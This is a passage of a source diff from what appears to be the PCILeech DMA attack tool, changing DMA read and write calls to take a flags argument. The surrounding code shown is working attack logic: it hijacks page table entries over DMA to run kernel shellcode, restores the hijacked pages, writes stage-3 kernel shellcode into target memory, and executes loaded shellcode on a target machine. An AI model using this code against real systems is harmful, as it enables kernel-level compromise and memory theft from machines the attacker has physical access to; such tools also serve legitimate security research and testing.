-	DeviceWriteDMA(pDeviceData, (DWORD)ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTE, sizeof(QWORD));
+	DeviceWriteDMA(pDeviceData, ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTE, sizeof(QWORD), 0);
 	//------------------------------------------------
 	// 5: wait for patch to reveive execution.
 	//------------------------------------------------
@@ -829,7 +888,7 @@ BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
 	do {
 		Sleep(100);
-		if(!DeviceReadDMARetryOnFail(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096)) {
+		if(!DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
 			goto fail;
 		}
@@ -838,11 +897,11 @@ BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	//------------------------------------------------
 	// 6: Restore hijacked memory pages.
 	//------------------------------------------------
-	DeviceWriteDMA(pDeviceData, (DWORD)ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTEOrig, sizeof(QWORD));
-	DeviceWriteDMA(pDeviceData, (DWORD)ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTEOrig, sizeof(QWORD));
+	DeviceWriteDMA(pDeviceData, ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTEOrig, sizeof(QWORD), 0);
+	DeviceWriteDMA(pDeviceData, ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTEOrig, sizeof(QWORD), 0);
 	Sleep(100);
-	DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096);
-	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096);
+	DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, 0);
+	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
 	//------------------------------------------------
 	// 7: Set up kernel module shellcode (stage3)
 	//------------------------------------------------
@@ -850,11 +909,11 @@ BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		printf("KMD: Failed. Stage2 shellcode error.\n");
 		goto fail;
 	}
-	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096);
+	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096, 0);
 	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
 	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
 	pKMD->status = (PKMDDATA)pKMD->pbPageData;
-	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096);
+	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
 	//------------------------------------------------
 	// 8: Retrieve physical memory range map and complete open action.
 	//------------------------------------------------
@@ -883,7 +942,7 @@ BOOL KMDOpen_LoadExisting(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
 	pKMD->dwPageAddr32 = (DWORD)pCfg->qwKMD;
 	pKMD->status = (PKMDDATA)pKMD->pbPageData;
-	if(!DeviceReadDMARetryOnFail(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096)) {
+	if(!DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 		printf("KMD: Failed. Read failed @ address: 0x%08x\n", pKMD->dwPageAddr32);
 	}
 	if(pKMD->status->MAGIC != 0x0ff11337711333377) {
@@ -939,7 +998,7 @@ VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		printf("EXEC: Failed loading shellcode from file: '%s.ksh' ...\n", pCfg->szShellcodeName);
 		goto fail;
 	}
-	result = DeviceWriteDMAVerify(pDeviceData, (DWORD)phKMD->status->DMAAddrPhysical, pKmdExec->pbShellcode, (DWORD)pKmdExec->cbShellcode);
+	result = DeviceWriteDMAVerify(pDeviceData, phKMD->status->DMAAddrPhysical, pKmdExec->pbShellcode, (DWORD)pKmdExec->cbShellcode, PCILEECH_MEM_FLAG_RETRYONFAIL);
 	if(!result) {
 		printf("EXEC: Failed writing shellcode to target memory.\n");
 		goto fail;
@@ -963,7 +1022,7 @@ VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 			printf("EXEC: Failed writing data - more than %iMB is not supported.\n", cbMaxBufferSize / (1024*1024));
 			goto fail;
 		}
-		result = DeviceWriteDMA(pDeviceData, (DWORD)(phKMD->status->DMAAddrPhysical + phKMD->status->dataInExtraOffset), pCfg->pbIn, (DWORD)((pCfg->cbIn + 0xfff) & ~0xfff));
+		result = DeviceWriteDMA(pDeviceData, phKMD->status->DMAAddrPhysical + phKMD->status->dataInExtraOffset, pCfg->pbIn, (DWORD)((pCfg->cbIn + 0xfff) & ~0xfff), 0);
 		if(!result) {
 			printf("EXEC: Failed writing data to target memory.\n");
 			goto fail;
@@ -1000,7 +1059,7 @@ VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	if(phKMD->status->dataOutExtraLength > 0) {
 		// read extra output buffer
 		if(!(pbBuffer = LocalAlloc(LMEM_ZEROINIT, cbMaxBufferSize)) ||
-			!DeviceReadDMA(pDeviceData, (DWORD)(phKMD->status->DMAAddrPhysical + phKMD->status->dataOutExtraOffset), pbBuffer, cbMaxBufferSize)) {
+			!DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical + phKMD->status->dataOutExtraOffset, pbBuffer, cbMaxBufferSize, 0)) {
 			printf("EXEC: Error reading output.\n");
 			goto fail;
 		}
